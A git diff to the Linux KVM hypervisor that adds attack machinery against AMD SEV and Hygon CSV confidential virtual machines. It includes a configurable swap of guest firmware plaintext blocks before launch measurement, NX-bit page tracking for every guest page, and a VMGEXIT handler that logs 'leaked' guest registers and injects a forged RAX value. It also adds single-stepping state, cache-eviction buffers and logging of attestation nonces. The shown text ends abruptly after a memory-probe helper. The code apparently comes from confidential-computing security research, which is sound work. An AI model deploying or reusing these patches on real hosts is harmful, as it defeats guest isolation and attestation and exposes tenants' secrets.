diff --git a/arch/x86/include/asm/kvm_host.h b/arch/x86/include/asm/kvm_host.h
index 48b48408a8f2..17d571f5db2b 100644
--- a/arch/x86/include/asm/kvm_host.h
+++ b/arch/x86/include/asm/kvm_host.h
@@ -350,7 +350,9 @@ union kvm_mmu_page_role {
 		unsigned smm:8;
 	};
 };
-
+bool kvm_unpre_all(struct kvm *kvm, u32 asid);
+bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid);
+bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid);
 /*
  * kvm_mmu_extended_role complements kvm_mmu_page_role, tracking properties
  * relevant to the current MMU configuration.   When loading CR0, CR4, or EFER,
diff --git a/arch/x86/include/asm/kvm_page_track.h b/arch/x86/include/asm/kvm_page_track.h
index 3d040741044b..4d63a9ab9025 100644
--- a/arch/x86/include/asm/kvm_page_track.h
+++ b/arch/x86/include/asm/kvm_page_track.h
@@ -60,3 +60,7 @@ struct kvm_page_track_notifier_node {};
 #endif /* CONFIG_KVM_EXTERNAL_WRITE_TRACKING */
 
 #endif
+
+
+extern long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init);
+extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb);
\ No newline at end of file
diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
index 4431158309ae..31efdb1720b9 100644
--- a/arch/x86/kvm/mmu/mmu.c
+++ b/arch/x86/kvm/mmu/mmu.c
@@ -56,7 +56,7 @@
 #include <asm/vmx.h>
 
 #include "trace.h"
-
+#include <linux/intr_injection.h>
 extern bool itlb_multihit_kvm_mitigation;
 
 static bool nx_hugepage_mitigation_hard_disabled;
@@ -1064,6 +1064,38 @@ static bool kvm_zap_all_rmap_sptes(struct kvm *kvm,
 	return true;
 }
 
+bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid)
+{
+	bool flush = false;
+
+	flush = kvm_tdp_mmu_unpre_gfn(kvm, gfn, asid, flush);
+	// kvm_zap_gfn_range(kvm, gfn, gfn+1);
+	// flush = kvm_tdp_mmu_zap_leafs(kvm, gfn, gfn+1, flush);
+	return flush;
+}
+EXPORT_SYMBOL_GPL(kvm_unpre_gfn);
+
+bool kvm_unpre_all(struct kvm *kvm, u32 asid)
+{
+	bool flush = false;
+
+	flush = kvm_tdp_mmu_unpre_all(kvm, asid, flush);
+
+	return flush;
+}
+EXPORT_SYMBOL_GPL(kvm_unpre_all);
+
+bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid)
+{
+	bool flush = false;
+
+	flush = kvm_tdp_mmu_unpre_all_except_gfn(kvm, gfn, asid, flush);
+
+	return flush;
+}
+EXPORT_SYMBOL_GPL(kvm_unpre_all_except_gfn);
+
+
 unsigned int pte_list_count(struct kvm_rmap_head *rmap_head)
 {
 	struct pte_list_desc *desc;
@@ -4452,6 +4484,19 @@ static int kvm_tdp_mmu_page_fault(struct kvm_vcpu *vcpu,
 {
 	kvm_pfn_t orig_pfn;
 	int r;
+	int active;
+	struct kvm_memory_slot *slot;
+
+    if(atomic_read(&user_data_npf_ex.deliver_intr) == 1){
+		slot = kvm_vcpu_gfn_to_memslot(vcpu, fault->gfn);
+		active = kvm_gfn_is_write_tracked(vcpu->kvm,slot, fault->gfn);
+		pr_info("page_fault_handle_page_track: active: %d pf: %llx x:%d p:%d w:%d u:%d "
+				"rsvd %d pref:%d tdp:%d\n",
+				active, fault->addr, fault->exec,
+				fault->present, fault->write, fault->user, fault->rsvd,
+				fault->prefetch, fault->is_tdp);
+		pr_info("page_fault_handle_page_track: pfn: %llx guest RIP=0x%llx\n", fault->pfn, vcpu->arch.regs[VCPU_REGS_RIP]);
+    }
 
 	if (page_fault_handle_page_track(vcpu, fault))
 		return RET_PF_EMULATE;
@@ -7170,3 +7215,177 @@ void kvm_mmu_pre_destroy_vm(struct kvm *kvm)
 	if (kvm->arch.nx_huge_page_recovery_thread)
 		kthread_stop(kvm->arch.nx_huge_page_recovery_thread);
 }
+
+static bool spte_exec_unprotect(u64 *sptep, bool pt_protect)
+{
+	bool flush = false;
+	u64 spte = *sptep;
+	
+	if (spte & PT64_NX_MASK){
+		flush = true;
+		spte &= ~PT64_NX_MASK;
+		mmu_spte_update(sptep, spte);
+	}
+	return flush;
+}
+
+
+static bool spte_exec_protect(u64 *sptep, bool pt_protect)
+{
+	u64 spte = *sptep;
+
+	spte |= PT64_NX_MASK;
+	mmu_spte_update(sptep, spte);
+
+	return true;
+}
+
+static bool rmap_exec_unprotect(struct kvm_rmap_head *rmap_head,
+			       bool pt_protect)
+{
+	u64 *sptep;
+	struct rmap_iterator iter;
+	bool flush = false;
+
+	for_each_rmap_spte(rmap_head, &iter, sptep)
+		flush |= spte_exec_unprotect(sptep, pt_protect);
+
+	return flush;
+}
+
+static bool rmap_exec_protect(struct kvm_rmap_head *rmap_head,
+			       bool pt_protect)
+{
+	u64 *sptep;
+	struct rmap_iterator iter;
+	bool flush = false;
+
+	for_each_rmap_spte(rmap_head, &iter, sptep)
+		flush |= spte_exec_protect(sptep, pt_protect);
+
+	return flush;
+}
+
+
+bool kvm_mmu_slot_gfn_exec_unprotect(struct kvm *kvm,
+				    struct kvm_memory_slot *slot, u64 gfn,
+				    int min_level)
+{
+	struct kvm_rmap_head *rmap_head;
+	int i;
+	bool exec_unprotected = false;
+
+	if (is_error_pfn(gfn)){
+		return false;
+	}
+
+	if (kvm_memslots_have_rmaps(kvm)) {
+		for (i = min_level; i <= KVM_MAX_HUGEPAGE_LEVEL; ++i) {
+			rmap_head = gfn_to_rmap(gfn, i, slot);
+			exec_unprotected |= rmap_exec_unprotect(rmap_head, true);
+		}
+	}
+
+	return exec_unprotected;
+}
+
+bool kvm_mmu_slot_gfn_exec_protect(struct kvm *kvm,
+				    struct kvm_memory_slot *slot, u64 gfn,
+				    int min_level)
+{
+	struct kvm_rmap_head *rmap_head;
+	int i;
+	bool exec_protected = false;
+
+	if (is_error_pfn(gfn)){
+		return false;
+	}
+
+	if (kvm_memslots_have_rmaps(kvm)) {
+		for (i = min_level; i <= KVM_MAX_HUGEPAGE_LEVEL; ++i) {
+			rmap_head = gfn_to_rmap(gfn, i, slot);
+			exec_protected |= rmap_exec_protect(rmap_head, true);
+		}
+	}
+
+	return exec_protected;
+}
+
+
+bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb)
+{
+	struct kvm_memory_slot *slot;
+	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);
+	kvm_mmu_slot_gfn_exec_protect(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
+	kvm_tdp_mmu_exec_protect_gfn(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
+
+	if (flush_tlb)
+		kvm_flush_remote_tlbs_gfn(vcpu->kvm, gfn, PG_LEVEL_4K);
+	return true;
+}
+EXPORT_SYMBOL(kvm_vcpu_exec_protect_gfn);
+
+
+bool kvm_vcpu_exec_unprotect_gfn(struct kvm_vcpu *vcpu, u64 gfn)
+{
+	int retval;
+	struct kvm_memory_slot *slot;
+	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);
+	retval = kvm_mmu_slot_gfn_exec_unprotect(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
+	kvm_flush_remote_tlbs_gfn(vcpu->kvm, gfn, PG_LEVEL_4K);
+	return retval;
+}
+EXPORT_SYMBOL(kvm_vcpu_exec_unprotect_gfn);
+
+
+void kvm_slot_page_track_add_page_no_flush(struct kvm_vcpu *vcpu,
+				  struct kvm_memory_slot *slot, gfn_t gfn, bool init) {
+	/*
+	 * new track stops large page mapping for the
+	 * tracked page.
+	 */
+	if (init)
+		kvm_mmu_gfn_disallow_lpage(slot, gfn);
+	
+	kvm_vcpu_exec_protect_gfn(vcpu, gfn, false);
+}
+EXPORT_SYMBOL_GPL(kvm_slot_page_track_add_page_no_flush);
+
+//track all pages; taken from severed repo
+long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init) {
+	long count = 0;
+	u64 iterator, iterat_max;
+	struct kvm_memslots* slots;
+	struct kvm_memory_slot *slot;
+	int srcu_lock_retval,bkt,i;
+
+	for( i = 0; i < KVM_ADDRESS_SPACE_NUM; i++) {
+		slots = __kvm_memslots(vcpu->kvm,i);
+		kvm_for_each_memslot(slot, bkt, slots) {
+			iterat_max = slot->base_gfn + slot->npages;
+			srcu_lock_retval = srcu_read_lock(&vcpu->kvm->srcu);
+			write_lock(&vcpu->kvm->mmu_lock);
+			for (iterator=0; iterator < iterat_max; iterator++)
+			{
+				slot = kvm_vcpu_gfn_to_memslot(vcpu, iterator);
+				if ( slot != NULL ) {
+					kvm_slot_page_track_add_page_no_flush(vcpu, slot, iterator, init);
+					count++;
+
+				}
+				if( need_resched() || rwlock_needbreak(&vcpu->kvm->mmu_lock))  {
+					cond_resched_rwlock_write(&vcpu->kvm->mmu_lock);
+				}
+			}
+			write_unlock(&vcpu->kvm->mmu_lock);
+			srcu_read_unlock(&vcpu->kvm->srcu, srcu_lock_retval);
+		}
+	}
+	if( count > 0 ) {
+		kvm_flush_remote_tlbs(vcpu->kvm);
+	}
+	pr_info("KVM: %ld removed nx bits\n", count);
+    return count;
+}
+EXPORT_SYMBOL(kvm_start_tracking);
+
diff --git a/arch/x86/kvm/mmu/tdp_mmu.c b/arch/x86/kvm/mmu/tdp_mmu.c
index 8eef3ed5fe04..c4b494440d57 100644
--- a/arch/x86/kvm/mmu/tdp_mmu.c
+++ b/arch/x86/kvm/mmu/tdp_mmu.c
@@ -1826,3 +1826,124 @@ u64 *kvm_tdp_mmu_fast_pf_get_last_sptep(struct kvm_vcpu *vcpu, u64 addr,
 	 */
 	return rcu_dereference(sptep);
 }
+
+
+ 
+
+static bool exec_protect_gfn(struct kvm *kvm, struct kvm_mmu_page *root,
+			      gfn_t gfn, int min_level)
+{
+	struct tdp_iter iter;
+	u64 new_spte;
+	bool spte_set = false;
+
+	BUG_ON(min_level > KVM_MAX_HUGEPAGE_LEVEL);
+
+	rcu_read_lock();
+
+	for_each_tdp_pte_min_level(iter, root, min_level, gfn, gfn + 1) {
+		if (!is_shadow_present_pte(iter.old_spte) ||
+		    !is_last_spte(iter.old_spte, iter.level))
+			continue;
+
+		new_spte = iter.old_spte | PT64_NX_MASK;
+
+		if (new_spte == iter.old_spte)
+			break;
+
+		tdp_mmu_iter_set_spte(kvm, &iter, new_spte);
+		spte_set = true;
+	}
+
+	rcu_read_unlock();
+
+	return spte_set;
+}
+
+bool kvm_tdp_mmu_exec_protect_gfn(struct kvm *kvm,
+				   struct kvm_memory_slot *slot, gfn_t gfn,
+				   int min_level)
+{
+	struct kvm_mmu_page *root;
+	bool spte_set = false;
+
+	lockdep_assert_held_write(&kvm->mmu_lock);
+	for_each_tdp_mmu_root(kvm, root, slot->as_id)
+		spte_set |= exec_protect_gfn(kvm, root, gfn, min_level);
+
+	return spte_set;
+}
+
+
+
+static bool tdp_mmu_zap_exec_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
+			      gfn_t start, gfn_t end, bool can_yield, bool flush)
+{
+	struct tdp_iter iter;
+
+	end = min(end, tdp_mmu_max_gfn_exclusive());
+
+	lockdep_assert_held_write(&kvm->mmu_lock);
+
+	rcu_read_lock();
+
+	for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end) {
+		if (can_yield &&
+		    tdp_mmu_iter_cond_resched(kvm, &iter, flush, false)) {
+			flush = false;
+			continue;
+		}
+
+		if (!is_shadow_present_pte(iter.old_spte) ||
+		    !is_last_spte(iter.old_spte, iter.level))
+			continue;
+
+		tdp_mmu_set_spte(kvm, iter.as_id, iter.sptep,
+                 iter.old_spte, iter.old_spte & 0xfffffffffffff7fe,
+                 iter.gfn, iter.level);
+		// tdp_mmu_set_spte(kvm, kvm_mmu_page_as_id(sp), sp->ptep, old_spte, 0,
+		// 	 sp->gfn, sp->role.level + 1);
+		// tdp_mmu_zap_leafs(kvm, iter.as_id, iter.sptep, iter.old_spte, iter.gfn, iter.level);
+		flush = true;
+	}
+
+	rcu_read_unlock();
+
+	/*
+	 * Because this flow zaps _only_ leaf SPTEs, the caller doesn't need
+	 * to provide RCU protection as no 'struct kvm_mmu_page' will be freed.
+	 */
+	return flush;
+}
+
+
+bool kvm_tdp_mmu_zap_exec_leafs(struct kvm *kvm, int as_id, gfn_t start, gfn_t end,
+			   bool can_yield, bool flush)
+{
+	struct kvm_mmu_page *root;
+
+	for_each_tdp_mmu_root_yield_safe(kvm, root, as_id)
+		flush = tdp_mmu_zap_exec_leafs(kvm, root, start, end, can_yield, flush);
+
+	return flush;
+}
+
+
+bool kvm_tdp_mmu_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush)
+{
+	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, gfn, gfn+1, false, flush);
+	return true;
+}
+
+bool kvm_tdp_mmu_unpre_all(struct kvm *kvm, u32 asid, bool flush)
+{
+	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, 0, tdp_mmu_max_gfn_exclusive(), false, flush);
+	return true;
+}
+
+bool kvm_tdp_mmu_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush)
+{
+	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, 0, gfn, false, flush);
+	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, gfn+1, tdp_mmu_max_gfn_exclusive(), false, flush);
+	return true;
+}
diff --git a/arch/x86/kvm/mmu/tdp_mmu.h b/arch/x86/kvm/mmu/tdp_mmu.h
index 733a3aef3a96..f702232992af 100644
--- a/arch/x86/kvm/mmu/tdp_mmu.h
+++ b/arch/x86/kvm/mmu/tdp_mmu.h
@@ -48,6 +48,16 @@ void kvm_tdp_mmu_zap_collapsible_sptes(struct kvm *kvm,
 bool kvm_tdp_mmu_write_protect_gfn(struct kvm *kvm,
 				   struct kvm_memory_slot *slot, gfn_t gfn,
 				   int min_level);
+bool kvm_tdp_mmu_unpre_leafs(struct kvm *kvm, int as_id, gfn_t start,
+				 gfn_t end, bool can_yield, bool flush);
+bool kvm_tdp_mmu_zap_exec_leafs(struct kvm *kvm, int as_id, gfn_t start,
+				 gfn_t end, bool can_yield, bool flush);
+bool kvm_tdp_mmu_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
+bool kvm_tdp_mmu_unpre_all(struct kvm *kvm, u32 asid, bool flush);
+bool kvm_tdp_mmu_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
+bool kvm_tdp_mmu_exec_protect_gfn(struct kvm *kvm,
+				   struct kvm_memory_slot *slot, gfn_t gfn,
+				   int min_level);
 
 void kvm_tdp_mmu_try_split_huge_pages(struct kvm *kvm,
 				      const struct kvm_memory_slot *slot,
diff --git a/arch/x86/kvm/svm/csv.c b/arch/x86/kvm/svm/csv.c
index 173e8f23469f..7de514ebd8ec 100644
--- a/arch/x86/kvm/svm/csv.c
+++ b/arch/x86/kvm/svm/csv.c
@@ -111,9 +111,19 @@ int csv_vm_attestation(struct kvm *kvm, unsigned long gpa, unsigned long len)
 	data->len = len;
 
 	data->handle = sev->handle;
+
+	printk("csv_vm_attestation data->mnonce: %s\n", data->mnonce);
+
+	printk("csv_vm_attestation addr value length: %d\n", data->len);
+
+	// for (int i = 0; i < data->len; i++) {
+	// 	printk(KERN_CONT "%02x", ((u8 *)data->address)[i]);
+	// }
+
+
 	ret = hygon_kvm_hooks.sev_issue_cmd(kvm, SEV_CMD_ATTESTATION_REPORT,
 					    data, &error);
-
+	printk("csv after attestation data->mnonce: %s\n", data->mnonce);
 	if (ret)
 		pr_err("vm attestation ret %#x, error %#x\n", ret, error);
 
@@ -2553,6 +2563,7 @@ static int csv_handle_exit(struct kvm_vcpu *vcpu, fastpath_t exit_fastpath)
 	struct vcpu_svm *svm = to_svm(vcpu);
 	u32 exit_code = svm->vmcb->control.exit_code;
 	int ret = -EIO;
+	pr_info("csv exit vcpu: %d, got vmexit\n", vcpu->vcpu_id);
 
 	/*
 	 * NPF for csv3 is dedicated.
diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
index 4d7aa6efeb35..6fa7c75f6c12 100644
--- a/arch/x86/kvm/svm/sev.c
+++ b/arch/x86/kvm/svm/sev.c
@@ -32,7 +32,7 @@
 #include "svm_ops.h"
 #include "cpuid.h"
 #include "trace.h"
-
+#include <linux/intr_injection.h>
 #include "csv.h"
 
 #ifndef CONFIG_KVM_AMD_SEV
@@ -617,6 +617,32 @@ static unsigned long get_num_contig_pages(unsigned long idx,
 	return pages;
 }
 
+
+
+// uint64_t stage1_block_offsets[5] = {0xa5150,0xb51e0,0x145de0,0x1013c0,0x3d42e0};
+uint64_t stage1_block_offsets[1] = {0xa5150};
+
+typedef struct {
+    //move all blocks here continuously; offset from ovmf start
+    uint64_t target_block; 
+    //blocks to move continously to target_block from left to right; offset from ovmf tart
+    uint64_t * source_blocks;
+    uint64_t source_blocks_len;
+    bool active;
+} launch_attack_config_t;
+
+extern launch_attack_config_t launch_attack_config;
+
+launch_attack_config_t launch_attack_config = {
+    // .target_block = 0x003D06D0,
+	.target_block = 0x003706D0,
+    .source_blocks = stage1_block_offsets,
+    .source_blocks_len = 1,
+    .active = false,
+};
+EXPORT_SYMBOL(launch_attack_config);
+
+
 static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 {
 	unsigned long vaddr, vaddr_end, next_vaddr, npages, pages, size, i;
@@ -625,6 +651,8 @@ static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	struct sev_data_launch_update_data data;
 	struct page **inpages;
 	int ret;
+	uint64_t sizeIn16BChuncks;
+	uint64_t * ordered_16byte_chunks = NULL;
 
 	if (!sev_guest(kvm))
 		return -ENOTTY;
@@ -636,6 +664,73 @@ static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	size = params.len;
 	vaddr_end = vaddr + size;
 
+	printk("sev_launch_update_data: vaddr=%lx size=%lx vaddr_end=%lx\n",vaddr,size,vaddr_end);
+
+	if( size % 16 != 0) {
+		printk("sev_lauch_update_data called with size %lx which is not a multiple of 16, aborting",size);
+		ret = 1;
+		goto e_free;
+	}
+	if( (vaddr & (PAGE_SIZE -1)) != 0 ) {
+		printk("buffer is not page aligned");
+		ret = 1;
+		goto e_free;
+	}
+
+	printk("sev_launch_update_data: vaddr checks passed");
+	sizeIn16BChuncks = size/16;
+	ordered_16byte_chunks = vmalloc(sizeIn16BChuncks * sizeof(uint64_t)); 
+	if( ordered_16byte_chunks == NULL ) {
+		printk("sev_launch_update_data: failed to alloc ordered_16byte_chunks array\n");
+	}
+	for(i = 0; i < sizeIn16BChuncks; i++) {
+		ordered_16byte_chunks[i] = (i*16);
+	}
+	printk("sev_launch_update_data: ordered_16_byte_chunks array initialized\n");
+
+	//perform swapping and update array so that reading it from left to right still gives us the correct order
+	if( launch_attack_config.active) {
+		uint64_t target_offset = launch_attack_config.target_block;
+		uint64_t source_offset;
+		uint8_t buffer[16];
+		uint8_t buffer2[16];
+		int err_code;
+		for( i = 0; i < launch_attack_config.source_blocks_len; i++,target_offset+=16) {
+			source_offset = launch_attack_config.source_blocks[i];
+			printk("sev_launch_update_data: swapping target=%llx with source=%llx\n", vaddr+target_offset, vaddr+source_offset);
+			//copy target_offset to buffer
+			if( (err_code = copy_from_user(buffer,(void*)(vaddr+target_offset),16) )) {
+				printk("copy target to buffer failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy source_offset to buffer2
+			if( (err_code = copy_from_user(buffer2,(void*)(vaddr+source_offset),16) ) ) {
+				printk("copy source to buffer2 failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to buffer2 to source offset
+			if( (err_code = copy_to_user((void*)(vaddr+target_offset),buffer2,16))){
+				printk("copy buffer 2 to target failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//copy buffer to source_offset
+			if( (err_code = copy_to_user((void*)(vaddr+source_offset),buffer,16))) {
+				printk("copy buffer to source failed with %d\n",err_code);
+				ret = 1;
+				goto e_free;
+			}
+			//adjust entries in ordered_16byte_chunks array
+			ordered_16byte_chunks[target_offset/16] = source_offset;
+			ordered_16byte_chunks[source_offset/16] = target_offset;
+		}
+	}
+	printk("sev_launch_update_data: swapped plaintext data");
+
+
+
 	/* Lock the user memory. */
 	inpages = sev_pin_memory(kvm, vaddr, size, &npages, FOLL_WRITE);
 	if (IS_ERR(inpages))
@@ -682,6 +777,11 @@ static int sev_launch_update_data(struct kvm *kvm, struct kvm_sev_cmd *argp)
 	}
 	/* unlock the user pages */
 	sev_unpin_memory(kvm, inpages, npages);
+e_free:
+	if(ordered_16byte_chunks != NULL ) {
+		vfree(ordered_16byte_chunks);
+	}
+
 	return ret;
 }
 
@@ -2662,7 +2762,6 @@ static int sev_es_validate_vmgexit(struct vcpu_svm *svm)
 	struct kvm_vcpu *vcpu = &svm->vcpu;
 	u64 exit_code;
 	u64 reason;
-
 	/*
 	 * Retrieve the exit code now even though it may not be marked valid
 	 * as it could help with debugging.
@@ -3131,7 +3230,51 @@ int sev_handle_vmgexit(struct kvm_vcpu *vcpu)
 		ret = -EINVAL;
 		break;
 	default:
+		if (exit_code == 0x81 || exit_code == 0x6f)
+		{
+			pr_info("vcpu: %d, got vmexit 0x%llx with ghcb gpa: %llx\n", vcpu->vcpu_idx,exit_code, ghcb_gpa);
+			switch (exit_code){
+				case 0x81:
+					pr_info("leaked RAX: 0x%llx\n", svm->sev_es.ghcb->save.rax);
+					pr_info("ori rax is: 0x%llx\n", vcpu->arch.regs[VCPU_REGS_RAX]);			
+					if (svm->sev_es.ghcb->save.rax != 0xc) {
+						vcpu->arch.regs[VCPU_REGS_RAX] = 0x12345678;
+						pr_info("rip is: 0x%llx\n", svm->sev_es.ghcb->save.rip);
+						pr_info("rdx is: 0x%llx\n", svm->sev_es.ghcb->save.rdx);
+						pr_info("leaked rax is: 0x%llx\n", svm->sev_es.ghcb->save.rax);
+						return 1;
+					}
+					break;
+				default:
+					pr_info("no custom VC handling function initialized: code 0x%llx",exit_code);
+			}
+		}
+		// if (exit_code == 0x87 || exit_code == 0x6e)
+		// {
+		// 	user_data_npf_ex.vmmcall_num++;
+		// 	pr_info("rdtscp inject\n");
+		// 	vcpu->arch.regs[VCPU_REGS_RAX] = svm->sev_es.ghcb->save.rax;
+		// 	vcpu->arch.regs[VCPU_REGS_RCX] = svm->sev_es.ghcb->save.rcx;
+		// 	vcpu->arch.regs[VCPU_REGS_RDX] = svm->sev_es.ghcb->save.rdx;
+		// 	return 1;
+		// }
+
+	
 		ret = svm_invoke_exit_handler(vcpu, exit_code);
+			if (exit_code == 0x81)
+		{
+			pr_info("rax is: 0x%llx, ret is: 0x%llx\n", 
+			vcpu->arch.regs[VCPU_REGS_RAX], ret);
+		}
+		// Check legal return value
+		if (exit_code == 0x87 || exit_code == 0x6e) {
+			pr_info("rax is: 0x%llx, rcx is: 0x%llx, rdx is: 0x%llx\n", 
+			vcpu->arch.regs[VCPU_REGS_RAX], vcpu->arch.regs[VCPU_REGS_RCX], vcpu->arch.regs[VCPU_REGS_RDX]);
+			pr_info("ghcb rax is: 0x%llx, rcx is: 0x%llx, rdx is: 0x%llx\n", 
+			svm->sev_es.ghcb->save.rax, svm->sev_es.ghcb->save.rcx, svm->sev_es.ghcb->save.rdx);
+			pr_info("inject ret is: 0x%llx\n", ret);
+		}
 	}
 
 	return ret;
diff --git a/arch/x86/kvm/svm/svm.c b/arch/x86/kvm/svm/svm.c
index 568b98842818..427790f07ea4 100644
--- a/arch/x86/kvm/svm/svm.c
+++ b/arch/x86/kvm/svm/svm.c
@@ -44,8 +44,11 @@
 #include <asm/fpu/api.h>
 #include <asm/processor-hygon.h>
 
+#include <linux/intr_injection.h>
 #include <trace/events/ipi.h>
-
+#include <asm/tlbflush.h>
+#include <linux/mm.h>
+#include "pmu.h"
 #include "trace.h"
 
 #include "svm.h"
@@ -147,6 +150,62 @@ static const struct svm_direct_access_msrs {
 	{ .index = MSR_INVALID,				.always = false },
 };
 
+
+/* Interrupt Framework */
+#define SEV_STEP_FLAG_BASE_PFN 0x1FEE01
+
+static void* vmsa_vaddr;
+static void* sev_step_page_va;
+
+static u16 zero_stepping_time = 0;
+static u32 non_zero_stepping_time = 0;
+static u32 apic_interval = 0;
+static u64 last_vmsa_rip = 0;
+
+#define PATH_OFFSET 16 
+static bool find_target = true;
+static bool allow_invd = false;
+static bool start_counting = false;
+static u64 last_npf_gfn = 0;
+
+static u16 path_index = 0;
+static u16 instr_counter = 0;
+static u64 step_runtime = 0;
+
+/* VMSA REG_BLOCK */
+static u64 last_vmsa_rsp = 0; // 1d8h
+static u64 last_vmsa_rax = 0; // 1f8h
+static u64 last_vmsa_rcx = 0; // 308h
+static u64 last_vmsa_rdx_rbx = 0; // 310h
+static u64 last_vmsa_rbp = 0; // 328h
+static u64 last_vmsa_rsi_rdi = 0; // 330h
+static u64 last_vmsa_r8_r9 = 0; // 340h
+static u64 last_vmsa_r10_r11 = 0; // 350h
+static u64 last_vmsa_r12_r13 = 0; // 360h
+static u64 last_vmsa_r14_r15 = 0; // 370h
+
+/* INCOMPLETE */
+static u64 last_vmsa_xmm = 0; // 470h
+static u64 last_vmsa_ymm = 0; // 570h
+static u64 last_vmsa_cs = 0; // 10h
+static u64 last_vmsa_ss = 0; // 20h
+
+static u16 last_reg_vector = 0;
+static u16 cur_invd_idx = 0;
+
+/* MEMORY - FOR NPF */
+// static u64 read_mem  = 0;
+// static u64 write_mem = 0;
+
+struct page *tpage = NULL;
+static void *dst_vaddr;
+static u64 dst_paddr = 0;
+static u64 vmsa_paddr = 0;
+static u64 npf_gfn = 0;
+
+static void *evict_buffer[20];
+
+
 /*
  * These 2 parameters are used to config the controls for Pause-Loop Exiting:
  * pause_filter_count: On processors that support Pause filtering(indicated
@@ -1443,6 +1502,20 @@ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
 	struct page *vmsa_page = NULL;
 	int err;
 
+	tpage = (void *)alloc_page(GFP_KERNEL | __GFP_ZERO);
+	if (!tpage)
+		return -ENOMEM;
+	for (int i = 0; i < 20; i++) {
+		evict_buffer[i] = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO | __GFP_COMP, 9);
+		if (!evict_buffer[i])
+			return -ENOMEM;
+		printk("evict_buffer_%d: %lx\n", i, __pa(evict_buffer[i]));
+	}
+	dst_vaddr = vmap(&tpage, 1, 0, PAGE_KERNEL);
+	dst_paddr = __sme_page_pa(tpage);
+	sev_step_page_va = kmap_local_pfn(SEV_STEP_FLAG_BASE_PFN);
+
+
 	BUILD_BUG_ON(offsetof(struct vcpu_svm, vcpu) != 0);
 	svm = to_svm(vcpu);
 
@@ -1491,7 +1564,10 @@ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
 	svm_switch_vmcb(svm, &svm->vmcb01);
 
 	if (vmsa_page)
+	{
 		svm->sev_es.vmsa = page_address(vmsa_page);
+		vmsa_paddr = svm->vmcb->control.vmsa_pa;
+	}
 
 	svm->guest_state_loaded = false;
 
@@ -2085,11 +2161,48 @@ static int pf_interception(struct kvm_vcpu *vcpu)
 static int npf_interception(struct kvm_vcpu *vcpu)
 {
 	struct vcpu_svm *svm = to_svm(vcpu);
-
+	u64 flag = *((volatile u64 *)(sev_step_page_va));
+	u8 page_guide = (flag >> 13) & 0x1;
+	u8 page_verbose = (flag >> 14) & 0x1;
+	u64 check_address = user_data_npf_ex.single_step_page_gpa;
 	u64 fault_address = svm->vmcb->control.exit_info_2;
 	u64 error_code = svm->vmcb->control.exit_info_1;
+	static u64 npf_gfn_p = 0;
+	// trace_kvm_page_fault(vcpu, fault_address, error_code);
+	// atomic_set(&user_data_npf_ex.signal_apic_timer, 0);
+	// if(check_address == fault_address)
+	// {
+	// 	apic_interval = user_data_npf_ex.single_pic_interval & 0xffff;
+	// 	pr_info("Step NPF at 0x%llx\n", fault_address);
+	// 	atomic_set(&user_data_npf_ex.signal_apic_timer, 1); // next step is set apic timer
+	// }
+	// else
+	// {
+	// 	apic_interval = 0;
+	// }
+	// if ((error_code & PFERR_FETCH_MASK) && ((flag & 0xff) == 0x77)) {
+
+	// 	npf_gfn = fault_address >> PAGE_SHIFT;
+	// 	npf_gfn_p = check_address >> PAGE_SHIFT;
+	// 	pr_info("npf_gfn: 0x%llx target: 0x%llx\n", fault_address, check_address);
+	// 	/* Fetch New Page. Reset state */
+	// 	if (npf_gfn != last_npf_gfn) {
+	// 		last_npf_gfn = npf_gfn;
+	// 	}
+
+	// 	if ((fault_address == check_address)) {
+	// 		apic_interval = 6 & 0xffff;
+	// 		pr_info("Fetch NPF at 0x%llx set APIC: 0x%x\n", fault_address, apic_interval);
+	// 	}
+	// 	else {
+	// 		apic_interval = 0; /* next npf */
+	// 		kvm_unpre_gfn(vcpu->kvm, npf_gfn_p, svm->asid);
+	// 		// kvm_unpre_all_except_gfn(vcpu->kvm, npf_gfn, svm->vmcb->control.asid);
+	// 		svm_flush_tlb_current(vcpu);
+	// 	}
+	// }
+
 
-	trace_kvm_page_fault(vcpu, fault_address, error_code);
 	return kvm_mmu_page_fault(vcpu, fault_address, error_code,
 			static_cpu_has(X86_FEATURE_DECODEASSISTS) ?
 			svm->vmcb->control.insn_bytes : NULL,
@@ -2278,8 +2391,151 @@ static int smi_interception(struct kvm_vcpu *vcpu)
 	return 1;
 }
 
+
+void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
+
